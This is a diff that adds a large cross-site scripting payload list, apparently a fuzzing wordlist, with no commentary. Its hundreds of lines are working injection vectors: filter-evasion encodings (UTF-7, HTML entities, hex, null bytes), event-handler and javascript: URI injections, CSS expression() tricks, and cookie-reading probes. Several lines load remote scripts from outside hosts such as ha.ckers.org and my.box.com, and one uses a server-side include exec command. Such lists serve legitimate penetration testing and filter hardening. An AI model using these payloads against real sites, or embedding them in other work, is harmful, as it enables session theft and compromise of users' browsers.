@@ -1,0 +1,414 @@
+'>//\\,<'>">">"*"
+&#00;</form><input type&#61;"date" onfocus="prompt(1)">
+0\"autofocus/onfocus=prompt(1)--><video/poster/ error=prompt(2)>"-confirm(3)-"
+0\"autofocus/onfocus=prompt(1)--><video/poster/onerror=prompt(2)>"-confirm(3)-"
+0&q=';prompt(String.fromCharCode(88,83,83))//
+&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
+¼script¾prompt(¢XSS¢)¼/script¾
+>%22%27><img%20src%3d%22javascript:prompt(%27%20XSS%27)%22>
+%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)’%3E
+%22%3e%3cscript%3eprompt('XSS')%3c/script%3e
+%22;prompt%28%27RVRSH3LL_XSS%29//
+%253cscript%253eprompt(1)%253c/script%253e
+%253cscript%253eprompt(document.cookie)%253c/script%253e
+%253Cscript%253Eprompt('XSS')%253C%252Fscript%253E
+"%27><img%20src%20onerror=prompt(1)>
+%2BACIAPgA8-script%2BAD4-prompt%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-
+%2BADw-script+AD4-prompt(document.location)%2BADw-/script%2BAD4-
+&#34;&#62;<h1/onmouseover='\u0061lert(1)'>
+&#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00
+&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
+%3Cimg%20src=x%20onerror=print()%3e
+%3cscript%3eprompt('XSS')%3c/script%3e
+"'`>ABC<div style="font-family:'foo'\x3Bx:expression(javascript:prompt(1);/*';">DEF 
+"'`>ABC<div style="font-family:'foo'\x7Dx:expression(javascript:prompt(1);/*';">DEF 
++ACIAPgA8-script+AD4-prompt(document.location)+ADw-/script+AD4APAAi-
++ADw-script+AD4-prompt(document.location)+ADw-/script+AD4-
+a="get";b="URL";c="javascript:";d="prompt('xss');";eval(a+b+c+d);
+"/></a></><img src=1.gif onerror=prompt(1)>
+&apos;&apos;;!--&quot;&lt;XSS&gt;=&amp;{()}
+&apos;;prompt(String.fromCharCode(88,83,83))//
+a=&quot;get&quot;;&amp;#10;b=&quot;URL(&quot;&quot;;&amp;#10;c=&quot;javascript:&quot;;&amp;#10;d=&quot;prompt(&apos;XSS&apos;);&quot;)&quot;;&#10;eval(a+b+c+d);
+%BCscript%BEprompt(%A2XSS%A2)%BC/script%BE
+";>;<;BODY onload!#$%&;()*~+-_.,:;?@[/|\]^`=prompt(";XSS";)>;
+"><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=prompt("XSS")>
+<BODY ONLOAD=prompt('XSS')>
+<br size=\"&{prompt('XSS')}\">
+</br style=a:expression(prompt())>
+data:text/html;charset=utf-7;base64,Ij48L3RpdGxlPjxzY3JpcHQ+YWxlcnQoMTMzNyk8L3NjcmlwdD4=
+d=\"prompt('XSS');\\")\";
+element[attribute='<img src=x onerror=prompt('XSS');>
+Execute(MsgBox(chr(88)&chr(83)&chr(83)))<
+foo\’; prompt(document.cookie);//’;
+foo<script>prompt(document.cookie)</script>
+//<form/action=javascript&#x3A;prompt&lpar;document&period;cookie&rpar;><input/type='submit'>//
+g'"></IFRAME>Hover the cursor to the LEFT of this Message</h1>&ParamHeight=250
+"><h1><IFRAME SRC="javascript:prompt('XSS');"></IFRAME>">123</h1>
+"><h1><IFRAME SRC=# onmouseover="prompt(document.cookie)"></IFRAME>123</h1>
+><h1><IFRAME width="420" height="315" frameborder="0" onmouseover="document.location.href='https://www.google.com
+"><h1><iframe width="420" height="315" src="http://www.google.com" frameborder="0" allowfullscreen></iframe>123</h1>
+"><h1><IFRAME width="420" height="315" SRC="http://www.google.com" frameborder="0" onmouseover="prompt(document.cookie)"></IFRAME>123</h1>
+http://www.google<script .com>prompt(document.location)</script
+"></iframe><script>prompt(123)</script>
+"></iframe><script>prompt(`TEXT YOU WANT TO BE DISPLAYED`);</script><iframe frameborder="0%EF%BB%BF
+/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
+>"'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;prompt(%26quot;%26%23x20;XSS%26%23x20;Test%26%23x20;Successful%26quot;)>
+"/><img/onerror=\x09javascript:prompt(1)\x09src=xxx:x />
+"/><img/onerror=\x0Ajavascript:prompt(1)\x0Asrc=xxx:x />
+"/><img/onerror=\x0Bjavascript:prompt(1)\x0Bsrc=xxx:x />
+"/><img/onerror=\x0Cjavascript:prompt(1)\x0Csrc=xxx:x />
+"/><img/onerror=\x0Djavascript:prompt(1)\x0Dsrc=xxx:x />
+"/><img/onerror=\x20javascript:prompt(1)\x20src=xxx:x />
+"/><img/onerror=\x22javascript:prompt(1)\x22src=xxx:x />
+"/><img/onerror=\x27javascript:prompt(1)\x27src=xxx:x />
+"/><img/onerror=\x60javascript:prompt(1)\x60src=xxx:x />
+<img src=1 oNeRrOr=prompt`1`>
+<IMG SRC="javascript:prompt('XSS')"
+#"><img src=M onerror=prompt('XSS');>
+<--`<img/src=` onerror=prompt(1)> --!>
+`"'><img src='#\x27 onerror=javascript:prompt(1)>
+"><img src=x onerror=javascript:prompt("1")>
+"><img src=x onerror=javascript:prompt('1')>
+"><img src=x onerror=javascript:prompt(("1"))>
+"><img src=x onerror=javascript:prompt(('1'))>
+"><img src=x onerror=javascript:prompt((`1`))>
+"><img src=x onerror=javascript:prompt(`1`)>
+"><img src=x onerror=javascript:prompt(1)>
+"><img src=x onerror=javascript:prompt("A")>
+"><img src=x onerror=javascript:prompt('A')>
+"><img src=x onerror=javascript:prompt(("A"))>
+"><img src=x onerror=javascript:prompt(('A'))>
+"><img src=x onerror=javascript:prompt((`A`))>
+"><img src=x onerror=javascript:prompt((A))>
+"><img src=x onerror=javascript:prompt(`A`)>
+"><img src=x onerror=javascript:prompt(A)>
+'><img src=x onerror=prompt(1)>
+<img src=x onerror=prompt(1)>
+"><img src=x onerror=window.open('https://www.google.com/');>
+--><!-- ---> <img src=xxx:x onerror=javascript:prompt(1)> -->
+`"'><img src=xxx:x onerror\x00=javascript:prompt(1)>
+`"'><img src=xxx:x onerror\x09=javascript:prompt(1)>
+`"'><img src=xxx:x onerror\x0A=javascript:prompt(1)>
+`"'><img src=xxx:x onerror\x0B=javascript:prompt(1)>
+`"'><img src=xxx:x onerror\x0C=javascript:prompt(1)>
+`"'><img src=xxx:x onerror\x0D=javascript:prompt(1)>
+`"'><img src=xxx:x onerror\x20=javascript:prompt(1)>
+`"'><img src=xxx:x \x00onerror=javascript:prompt(1)>
+`"'><img src=xxx:x \x09onerror=javascript:prompt(1)>
+`"'><img src=xxx:x \x0Aonerror=javascript:prompt(1)>
+`"'><img src=xxx:x \x0Bonerror=javascript:prompt(1)>
+`"'><img src=xxx:x \x0Conerror=javascript:prompt(1)>
+`"'><img src=xxx:x \x0Donerror=javascript:prompt(1)>
+`"'><img src=xxx:x \x20onerror=javascript:prompt(1)>
+`"'><img src=xxx:x \x22onerror=javascript:prompt(1)>
+`"'><img src=xxx:x \x27onerror=javascript:prompt(1)>
+`"'><img src=xxx:x \x2Fonerror=javascript:prompt(1)>
+<INPUT TYPE="IMAGE" SRC="javascript:prompt('XSS');">
+javascript:prompt%281%29;
+javascript:prompt("hellox worldss")
+">/KinG-InFeT.NeT/><script>prompt(document.cookie)</script>
+&lt;!&#91;endif&#93;--&gt;
+&lt;!--&#91;if gte IE 4&#93;&gt;
+&lt;A HREF=\"//google\"&gt;XSS&lt;/A&gt;
+&lt;A HREF=\"http&#58;//0102&#46;0146&#46;0007&#46;00000223/\"&gt;XSS&lt;/A&gt;
+&lt;A HREF=\"http&#58;//0x42&#46;0x0000066&#46;0x7&#46;0x93/\"&gt;XSS&lt;/A&gt;
+&lt;A HREF=\"http&#58;//1113982867/\"&gt;XSS&lt;/A&gt;
+&lt;A HREF=\"htt p&#58;//6 6&#46;000146&#46;0x7&#46;147/\"&gt;XSS&lt;/A&gt;
+&lt;A HREF=\"http&#58;//66&#46;102&#46;7&#46;147/\"&gt;XSS&lt;/A&gt;
+&lt;A HREF=\"http&#58;//%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\"&gt;XSS&lt;/A&gt;
+&lt;A HREF=\"http&#58;//google&#46;com/\"&gt;XSS&lt;/A&gt;
+&lt;A HREF=\"http&#58;//google&#58;ha&#46;ckers&#46;org\"&gt;XSS&lt;/A&gt;
+&lt;A HREF=\"http&#58;//ha&#46;ckers&#46;org@google\"&gt;XSS&lt;/A&gt;
+&lt;A HREF=\"http&#58;//www&#46;gohttp&#58;//www&#46;google&#46;com/ogle&#46;com/\"&gt;XSS&lt;/A&gt;
+&lt;A HREF=\"http&#58;//www&#46;google&#46;com&#46;/\"&gt;XSS&lt;/A&gt;
+&lt;A HREF=\"javascript&#058;document&#46;location='http&#58;//www&#46;google&#46;com/'\"&gt;XSS&lt;/A&gt;
+&lt;A HREF=&quot;//google&quot;&gt;XSS&lt;/A&gt;
+&lt;A HREF=&quot;http://0102.0146.0007.00000223/&quot;&gt;XSS&lt;/A&gt;
+&lt;A HREF=&quot;http://0x42.0x0000066.0x7.0x93/&quot;&gt;XSS&lt;/A&gt;
+&lt;A HREF=&quot;http://1113982867/&quot;&gt;XSS&lt;/A&gt;
+&lt;A HREF=&quot;http://66.102.7.147/&quot;&gt;XSS&lt;/A&gt;
+&lt;A HREF=&quot;http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D&quot;&gt;XSS&lt;/A&gt;
+&lt;A HREF=&quot;http://google.com/&quot;&gt;XSS&lt;/A&gt;
+&lt;A HREF=&quot;http://www.gohttp://www.google.com/ogle.com/&quot;&gt;XSS&lt;/A&gt;
+&lt;A HREF=&quot;http://www.google.com./&quot;&gt;XSS&lt;/A&gt;
+&lt;A HREF=&quot;h&#x0A;tt&#09;p://6&amp;#09;6.000146.0x7.147/&quot;&gt;XSS&lt;/A&gt;
+&lt;A HREF=&quot;javascript:document.location=&apos;http://www.google.com/&apos;&quot;&gt;XSS&lt;/A&gt;
+&lt;A HREF=&quot;//www.google.com/&quot;&gt;XSS&lt;/A&gt;
+&lt;A HREF=\"//www&#46;google&#46;com/\"&gt;XSS&lt;/A&gt;
+&lt;BASE HREF=\"javascript&#058;prompt('XSS');
+&lt;BASE HREF=&quot;javascript:prompt(&apos;XSS&apos;);//&quot;&gt;
+&lt;BGSOUND SRC=\"javascript&#058;prompt('XSS');\"&gt;
+&lt;BGSOUND SRC=&quot;javascript:prompt(&apos;XSS&apos;);&quot;&gt;
+&lt;BODY BACKGROUND=\"javascript&#058;prompt('XSS')\"&gt;
+&lt;BODY BACKGROUND=&quot;javascript:prompt(&apos;XSS&apos;);&quot;&gt;
+&lt;/BODY&gt;&lt;/HTML&gt;
+&lt;BODY onload!#$%&()*~+-_&#46;,&#58;;?@&#91;/|\&#93;^`=prompt(\"XSS\")&gt;
+&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=prompt(&quot;XSS&quot;)&gt;
+&lt;BODY ONLOAD=prompt(&apos;XSS&apos;)&gt;
+&lt;BODY ONLOAD=prompt('XSS')&gt;
+&lt;BR SIZE=\"&{prompt('XSS')}\"&gt;
+&lt;BR SIZE=&quot;&amp;{prompt(&apos;XSS&apos;)}&quot;&gt;
+&lt;/C&gt;&lt;/X&gt;&lt;/xml&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;
+&lt;DIV STYLE=\"background-image&#58;\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028&#46;1027\0058&#46;1053\0053\0027\0029'\0029\"&gt;
+&lt;DIV STYLE=\"background-image&#58; url(javascript&#058;prompt('XSS'))\"&gt;
+&lt;DIV STYLE=&quot;background-image:\0075\0072\006C\0028&apos;\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029&apos;\0029&quot;&gt;
+&lt;DIV STYLE=&quot;background-image: url(&amp;#1;javascript:prompt(&apos;XSS&apos;))&quot;&gt;
+&lt;DIV STYLE=&quot;background-image: url(javascript:prompt(&apos;XSS&apos;))&quot;&gt;
+&lt;DIV STYLE=&quot;width: expression(prompt(&apos;XSS&apos;));&quot;&gt;
+&lt;DIV STYLE=\"width&#58; expression(prompt('XSS'));\"&gt;
+&lt;? echo(&apos;&lt;SCR)&apos;;
+&lt;? echo('&lt;SCR)';
+&lt;EMBED SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;swf\" AllowScriptAccess=\"always\"&gt;&lt;/EMBED&gt;
+&lt;!--#exec cmd=\"/bin/echo '&lt;SCR'\"--&gt;&lt;!--#exec cmd=\"/bin/echo 'IPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js&gt;&lt;/SCRIPT&gt;'\"--&gt;
+&lt;FRAMESET&gt;&lt;FRAME SRC=\"javascript&#058;prompt('XSS');\"&gt;&lt;/FRAMESET&gt;
+&lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:prompt(&apos;XSS&apos;);&quot;&gt;&lt;/FRAMESET&gt;
+&lt;HEAD&gt;&lt;META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-prompt('XSS');+ADw-/SCRIPT+AD4-
+&lt;HEAD&gt;&lt;META HTTP-EQUIV=&quot;CONTENT-TYPE&quot; CONTENT=&quot;text/html; charset=UTF-7&quot;&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-prompt(&apos;XSS&apos;);+ADw-/SCRIPT+AD4-
+&lt;HTML&gt;&lt;BODY&gt;
+&lt;HTML xmlns&#58;xss&gt;&lt;?import namespace=\"xss\" implementation=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;htc\"&gt;&lt;xss&#58;xss&gt;XSS&lt;/xss&#58;xss&gt;&lt;/HTML&gt;
+&lt;HTML xmlns:xss&gt;
+&lt;!--[if gte IE 4]&gt;               
+&lt;iframe src=http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html&gt;
+&lt;IFRAME SRC=\"javascript&#058;prompt('XSS');\"&gt;&lt;/IFRAME&gt;
+&lt;IFRAME SRC=&quot;javascript:prompt(&apos;XSS&apos;);&quot;&gt;&lt;/IFRAME&gt;
+&lt;IMG DYNSRC=\"javascript&#058;prompt('XSS')\"&gt;
+&lt;IMG DYNSRC=&quot;javascript:prompt(&apos;XSS&apos;);&quot;&gt;
+&lt;IMG \"\"\"&gt;&lt;SCRIPT&gt;prompt(\"XSS\")&lt;/SCRIPT&gt;\"&gt;
+&lt;IMG LOWSRC=\"javascript&#058;prompt('XSS')\"&gt;
+&lt;IMG LOWSRC=&quot;javascript:prompt(&apos;XSS&apos;);&quot;&gt;
+&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;prompt(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;
+&lt;IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041&gt;
+&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;
+&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;
+&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;
+&lt;IMG SRC=&apos;vbscript:msgbox(&quot;XSS&quot;)&apos;&gt;
+&lt;IMG SRC=\"http&#58;//www&#46;thesiteyouareon&#46;com/somecommand&#46;php?somevariables=maliciouscode\"&gt;
+&lt;IMG SRC=javascript&#058;prompt(&quot;XSS&quot;)&gt;
+&lt;IMG SRC=`javascript&#058;prompt(\"RSnake says, 'XSS'\")`&gt;
+&lt;IMG SRC=javascript&#058;prompt(String&#46;fromCharCode(88,83,83))&gt;
+&lt;IMG SRC=\"javascript&#058;prompt('XSS')\"
+&lt;IMG SRC=\"   javascript&#058;prompt('XSS');\"&gt;
+&lt;IMG SRC=\"javascript&#058;prompt('XSS');\"&gt;
+&lt;IMG SRC=javascript&#058;prompt('XSS')&gt;
+&lt;IMG SRC=JaVaScRiPt&#058;prompt('XSS')&gt;
+&lt;IMG SRC=javascript:prompt(&amp;quot;XSS&amp;quot;)&gt;
+&lt;IMG SRC=javascript:prompt(&apos;XSS&apos;)&gt;
+&lt;IMG SRC=JaVaScRiPt:prompt(&apos;XSS&apos;)&gt;
+&lt;IMG SRC=`javascript:prompt(&quot;RSnake says, &apos;XSS&apos;&quot;)`&gt;
+&lt;IMG SRC=javascript:prompt(String.fromCharCode(88,83,83))&gt;
+&lt;IMG SRC=\"jav&#x09;ascript&#058;prompt('XSS');\"&gt;
+&lt;IMG SRC=\"jav&#x0A;ascript&#058;prompt('XSS');\"&gt;
+&lt;IMG SRC=\"jav&#x0D;ascript&#058;prompt('XSS');\"&gt;
+&lt;IMG SRC=\"livescript&#058;&#91;code&#93;\"&gt;
+&lt;IMG SRC=\"mocha&#58;&#91;code&#93;\"&gt;
+&lt;IMG SRC=&quot; &amp;#14;  javascript:prompt(&apos;XSS&apos;);&quot;&gt;
+&lt;IMG SRC=&quot;jav&amp;#x09;ascript:prompt(&apos;XSS&apos;);&quot;&gt;
+&lt;IMG SRC=&quot;jav&amp;#x0A;ascript:prompt(&apos;XSS&apos;);&quot;&gt;
+&lt;IMG SRC=&quot;jav&amp;#x0D;ascript:prompt(&apos;XSS&apos;);&quot;&gt;
+&lt;IMG SRC=&quot;javascript:prompt(&apos;XSS&apos;)&quot;
+&lt;IMG SRC=&quot;javascript:prompt(&apos;XSS&apos;);&quot;&gt;
+&lt;IMG SRC=&quot;jav&#x09;ascript:prompt(&apos;XSS&apos;);&quot;&gt;
+&lt;IMG SRC=&quot;mocha:[code]&quot;&gt;
+&lt;IMG SRC='vbscript&#058;msgbox(\"XSS\")'&gt;
+&lt;IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29&gt;
+&lt;IMG STYLE=&quot;xss:expr/*XSS*/ession(prompt(&apos;XSS&apos;))&quot;&gt;
+&lt;IMG STYLE=\"xss&#58;expr/*XSS*/ession(prompt('XSS'))\"&gt;
+&lt;IMG&#x0D;SRC&#x0D;=&#x0D;&quot;&#x0D;j&#x0D;a&#x0D;v&#x0D;a&#x0D;s&#x0D;c&#x0D;r&#x0D;i&#x0D;p&#x0D;t&#x0D;:&#x0D;a&#x0D;l&#x0D;e&#x0D;r&#x0D;t&#x0D;(&#x0D;&apos;&#x0D;X&#x0D;S&#x0D;S&#x0D;&apos;&#x0D;)&#x0D;&quot;&#x0D;&gt;&#x0D;
+&lt;?import namespace=\"t\" implementation=\"#default#time2\"&gt;
+&lt;INPUT TYPE=\"IMAGE\" SRC=\"javascript&#058;prompt('XSS');\"&gt;
+&lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:prompt(&apos;XSS&apos;);&quot;&gt;
+&lt;LAYER SRC=\"http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\"&gt;&lt;/LAYER&gt;
+&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:prompt(&apos;XSS&apos;);&quot;&gt;
+&lt;LINK REL=\"stylesheet\" HREF=\"http&#58;//
+&lt;LINK REL=\"stylesheet\" HREF=\"javascript&#058;prompt('XSS');\"&gt;
+&lt;&lt;SCRIPT&gt;prompt(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt;
+&lt;&lt;SCRIPT&gt;prompt(\"XSS\");//&lt;&lt;/SCRIPT&gt;
+&lt;META HTTP-EQUIV=\"Link\" Content=\"&lt;http&#58;//
+&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&quot;&gt;
+&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; URL=http://;URL=javascript:prompt(&apos;XSS&apos;);&quot;&gt;
+&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:prompt(&apos;XSS&apos;);&quot;&gt;
+&lt;META HTTP-EQUIV=&quot;Set-Cookie&quot; Content=&quot;USERID=&lt;SCRIPT&gt;prompt(&apos;XSS&apos;)&lt;/SCRIPT&gt;&quot;&gt;
+&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data&#58;text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\"&gt;
+&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http&#58;
+&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript&#058;prompt('XSS');\"&gt;
+&lt;META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=&lt;SCRIPT&gt;prompt('XSS')&lt;/SCRIPT&gt;\"&gt;
+&lt;OBJECT classid=clsid&#58;ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript&#058;prompt('XSS')&gt;&lt;/OBJECT&gt;
+&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript:prompt(&apos;XSS&apos;)&gt;&lt;/OBJECT&gt;
+&lt;SCRIPT a=\"&gt;'&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT \"a='&gt;'\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT a=\"&gt;\" '' SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT a=\"&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT a=`&gt;` SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT&gt;a=/XSS/
+&lt;SCRIPT&gt;document&#46;write(\"&lt;SCRI\");&lt;/SCRIPT&gt;PT SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT&gt;prompt(&apos;XSS&apos;)&lt;/SCRIPT&gt;
+&lt;SCRIPT&gt;prompt(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;
+&lt;SCRIPT&gt;prompt('XSS');&lt;/SCRIPT&gt;
+&lt;SCRIPT =\"&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT SRC=//ha&#46;ckers&#46;org/&#46;js&gt;
+&lt;SCRIPT SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;jpg\"&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT/SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js?&lt;B&gt;
+&lt;SCRIPT/XSS SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;
+&lt;SPAN DATASRC=\"#xss\" DATAFLD=\"B\" DATAFORMATAS=\"HTML\"&gt;&lt;/SPAN&gt;
+&lt;STYLE&gt;&#46;XSS{background-image&#58;url(\"javascript&#058;prompt('XSS')\");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;
+&lt;STYLE&gt;BODY{-moz-binding&#58;url(\"http&#58;//
+&lt;STYLE&gt;@im\port&apos;\ja\vasc\ript:prompt(&quot;XSS&quot;)&apos;;&lt;/STYLE&gt;
+&lt;STYLE&gt;@import'http&#58;//
+&lt;STYLE&gt;@im\port'\ja\vasc\ript&#58;prompt(\"XSS\")';&lt;/STYLE&gt;
+&lt;STYLE&gt;li {list-style-image&#58; url(\"javascript&#058;prompt('XSS')\");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS
+&lt;STYLE&gt;li {list-style-image: url(&quot;javascript:prompt(&#39;XSS&#39;)&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS
+&lt;STYLE&gt;.XSS{background-image:url(&quot;javascript:prompt(&apos;XSS&apos;)&quot;);}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;
+&lt;STYLE type=&quot;text/css&quot;&gt;BODY{background:url(&quot;javascript:prompt(&apos;XSS&apos;)&quot;)}&lt;/STYLE&gt;
+&lt;STYLE TYPE=&quot;text/javascript&quot;&gt;prompt(&apos;XSS&apos;);&lt;/STYLE&gt;
+&lt;STYLE type=\"text/css\"&gt;BODY{background&#58;url(\"javascript&#058;prompt('XSS')\")}&lt;/STYLE&gt;
+&lt;STYLE TYPE=\"text/javascript\"&gt;prompt('XSS');&lt;/STYLE&gt;
+&lt;t&#58;set attributeName=\"innerHTML\" to=\"XSS&lt;SCRIPT DEFER&gt;prompt(&quot;XSS&quot;)&lt;/SCRIPT&gt;\"&gt;
+&lt;TABLE BACKGROUND=\"javascript&#058;prompt('XSS')\"&gt;
+&lt;TABLE BACKGROUND=&quot;javascript:prompt(&apos;XSS&apos;)&quot;&gt;&lt;/TABLE&gt;
+&lt;TABLE&gt;&lt;TD BACKGROUND=\"javascript&#058;prompt('XSS')\"&gt;
+&lt;TABLE&gt;&lt;TD BACKGROUND=&quot;javascript:prompt(&apos;XSS&apos;)&quot;&gt;&lt;/TD&gt;&lt;/TABLE&gt;
+&lt;/TITLE&gt;&lt;SCRIPT&gt;prompt("XSS");&lt;/SCRIPT&gt;
+&lt;/TITLE&gt;&lt;SCRIPT&gt;prompt(\"XSS\");&lt;/SCRIPT&gt;
+&lt;?xml&#58;namespace prefix=\"t\" ns=\"urn&#58;schemas-microsoft-com&#58;time\"&gt;
+&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;!&#91;CDATA&#91;&lt;IMG SRC=\"javas&#93;&#93;&gt;&lt;!&#91;CDATA&#91;cript&#58;prompt('XSS');\"&gt;&#93;&#93;&gt;
+&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;IMG SRC=&quot;javas]]&gt;&lt;![CDATA[cript:prompt(&apos;XSS&apos;);&quot;&gt;]]&gt;
+&lt;XML ID=&quot;xss&quot;&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=&quot;javas&lt;!-- --&gt;cript:prompt(&apos;XSS&apos;)&quot;&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;
+&lt;XML ID=\"xss\"&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=\"javas&lt;!-- --&gt;cript&#58;prompt('XSS')\"&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;
+&lt;XML SRC=\"xsstest&#46;xml\" ID=I&gt;&lt;/XML&gt;
+'';!--\"&lt;XSS&gt;=&{()}
+&lt;XSS STYLE=\"behavior&#58; url(xss&#46;htc);\"&gt;
+&lt;XSS STYLE=&quot;xss:expression(prompt(&apos;XSS&apos;))&quot;&gt;
+&lt;XSS STYLE=\"xss&#58;expression(prompt('XSS'))\"&gt;
+'">><marquee><h1>XSS</h1></marquee>
+'>><marquee><h1>XSS</h1></marquee>
+" onfocus=prompt(document.domain) "> <"
+')prompt(1);//
+'; prompt(1);
+‘; prompt(document.cookie); var foo=’
+prompt;pg("XSS")
+';prompt(String&#46;fromCharCode(88,83,83))//
+";;prompt(String.fromCharCode(88,83,83))//
+";prompt(String.fromCharCode(88,83,83))//
+';;prompt(String.fromCharCode(88,83,83))//
+';prompt(String.fromCharCode(88,83,83))
+';prompt(String.fromCharCode(88,83,83))//
+<"';prompt(String.fromCharCode(88,83,83))//
+\";;prompt(String.fromCharCode(88,83,83))//
+\";prompt(String.fromCharCode(88,83,83))//
+\';;prompt(String.fromCharCode(88,83,83))//
+\';prompt(String.fromCharCode(88,83,83))//
+prompt(String.fromCharCode(88,83,83))//
